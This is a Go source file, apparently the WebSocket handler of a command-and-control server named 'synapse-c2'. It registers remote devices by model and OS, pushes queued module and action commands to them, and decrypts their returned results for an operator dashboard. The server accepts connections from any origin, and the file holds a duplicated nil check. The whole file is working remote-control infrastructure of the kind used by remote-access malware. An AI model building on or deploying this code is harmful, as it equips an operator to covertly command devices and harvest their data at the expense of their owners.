package service

import (
	"context"
	"encoding/json"
	"net/http"
	"time"

	"synapse-c2/app/synapse-c2/internal/model"

	"github.com/gogf/gf/v2/frame/g"
	"github.com/gorilla/websocket"
)

var upgrader = websocket.Upgrader{
	ReadBufferSize:  4096,
	WriteBufferSize: 4096,
	CheckOrigin: func(r *http.Request) bool {
		return true
	},
}

// HandleWebSocket manages a single device WebSocket connection.
func HandleWebSocket(ctx context.Context, conn *websocket.Conn) {
	defer conn.Close()

	var deviceID string
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	var pingTicker *time.Ticker
	var pingStop chan struct{}

	// startKeepalive launches a goroutine that sends pings every 30s
	// and sets a pong handler that extends the read deadline to 90s.
	startKeepalive := func() {
		if pingTicker != nil {
			return // already started
		}
		pingStop = make(chan struct{})
		pingTicker = time.NewTicker(30 * time.Second)

		// Pong handler: each pong resets the read deadline to 90s
		conn.SetPongHandler(func(string) error {
			conn.SetReadDeadline(time.Now().Add(90 * time.Second))
			return nil
		})

		// Reset initial read deadline to 90s
		conn.SetReadDeadline(time.Now().Add(90 * time.Second))

		go func() {
			for {
				select {
				case <-pingTicker.C:
					conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
					if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
						g.Log().Debugf(ctx, "WS ping write failed for %s: %v", deviceID, err)
						conn.Close()
						return
					}
				case <-pingStop:
					return
				}
			}
		}()
	}

	// stopKeepalive stops the ping ticker and pong handler
	stopKeepalive := func() {
		if pingTicker != nil {
			pingTicker.Stop()
			close(pingStop)
			pingTicker = nil
		}
	}
	defer stopKeepalive()

	for {
		_, msgBytes, err := conn.ReadMessage()
		if err != nil {
			if deviceID != "" {
				g.Log().Infof(ctx, "Device %s disconnected: %v", deviceID, err)
				Registry.Unregister(deviceID)
			}
			return
		}

		var msg model.WSMessage
		if err := json.Unmarshal(msgBytes, &msg); err != nil {
			g.Log().Warningf(ctx, "WS invalid JSON: %v", err)
			continue
		}

		switch msg.Type {
		case "register":
			if msg.DeviceID == "" {
				g.Log().Warning(ctx, "WS register without device_id")
				continue
			}
			deviceID = msg.DeviceID

			info := model.DeviceInfo{}
			if msg.Info != nil {
				info = *msg.Info
			}

			dev := Registry.Register(deviceID, info, conn)
			dev.Lock()
			dev.WS = conn
			dev.Unlock()

			// Start server-side ping keepalive after registration
			startKeepalive()

			g.Log().Infof(ctx, "Device registered via WS: %s (model=%s, os=%s)",
				deviceID, info.Model, info.OSVersion)

			// Send queued commands (must lock for each write)
			pushQueuedCommands(ctx, deviceID)

		case "result":
			handleResult(ctx, msg)

		case "ping":
			Registry.MarkSeen(deviceID)
			resp := model.WSMessage{Type: "pong"}
			data, _ := json.Marshal(resp)
			conn.WriteMessage(websocket.TextMessage, data)
		}
	}
}

// pushQueuedCommands sends all queued commands to the device over WS.
// Uses device mutex for each write to prevent concurrent access.
func pushQueuedCommands(ctx context.Context, deviceID string) {
	dev := Registry.Get(deviceID)
	if dev == nil {
		return
	}

	cmds := Registry.DequeueCommands(deviceID)
	for _, cmd := range cmds {
		wsMsg := model.WSMessage{
			Type:      "command",
			CommandID: cmd.ID,
			Module:    cmd.Module,
			Action:    cmd.Action,
			Params:    cmd.Params,
		}
		data, err := json.Marshal(wsMsg)
		if err != nil {
			g.Log().Errorf(ctx, "WS marshal command: %v", err)
			continue
		}

		dev.Lock()
		if dev.WS != nil && dev.WS != nil {
			err = dev.WS.WriteMessage(websocket.TextMessage, data)
		} else {
			err = websocket.ErrCloseSent
		}
		dev.Unlock()

		if err != nil {
			g.Log().Errorf(ctx, "WS push command to %s: %v", deviceID, err)
			Registry.EnqueueCommand(cmd)
			return
		}
		g.Log().Infof(ctx, "Command pushed to %s: %s/%s [%s]",
			deviceID, cmd.Module, cmd.Action, cmd.ID)
	}
}

// PushCommandToDevice sends a single command to a connected device via WS.
// Holds the device mutex for the entire check+write operation.
func PushCommandToDevice(ctx context.Context, cmd model.Command) {
	dev := Registry.Get(cmd.DeviceID)
	if dev == nil {
		g.Log().Warningf(ctx, "Device not found: %s", cmd.DeviceID)
		return
	}

	dev.Lock()
	defer dev.Unlock()

	if dev.WS == nil {
		g.Log().Infof(ctx, "Device %s not connected via WS, queuing command", cmd.DeviceID)
		Registry.EnqueueCommand(cmd)
		return
	}

	wsMsg := model.WSMessage{
		Type:      "command",
		CommandID: cmd.ID,
		Module:    cmd.Module,
		Action:    cmd.Action,
		Params:    cmd.Params,
	}
	data, err := json.Marshal(wsMsg)
	if err != nil {
		g.Log().Errorf(ctx, "WS marshal command: %v", err)
		Registry.EnqueueCommand(cmd)
		return
	}

	if err := dev.WS.WriteMessage(websocket.TextMessage, data); err != nil {
		g.Log().Debugf(ctx, "WS write to %s: %v, queuing", cmd.DeviceID, err)
		Registry.EnqueueCommand(cmd)
		return
	}

	g.Log().Infof(ctx, "Command sent to %s via WS: %s/%s [%s]",
		cmd.DeviceID, cmd.Module, cmd.Action, cmd.ID)
}

// handleResult processes an incoming result from a device.
func handleResult(ctx context.Context, msg model.WSMessage) {
	deviceID := msg.DeviceID

	decrypted := ""
	if msg.Data != "" {
		plain, err := Decrypt(msg.Data)
		if err != nil {
			decrypted = msg.Data
		} else {
			decrypted = plain
		}
	}

	g.Log().Infof(ctx, "=== RESULT from %s [cmd=%s] ===\n%s\n================================",
		deviceID, msg.CommandID, decrypted)

	result := model.DashboardResult{
		DeviceID:  deviceID,
		CommandID: msg.CommandID,
		Module:    msg.Module,
		Action:    msg.Action,
		Data:      decrypted,
		Time:      time.Now().Format(time.RFC3339),
	}
	Broadcaster.Broadcast(result)

	Registry.MarkSeen(deviceID)
}
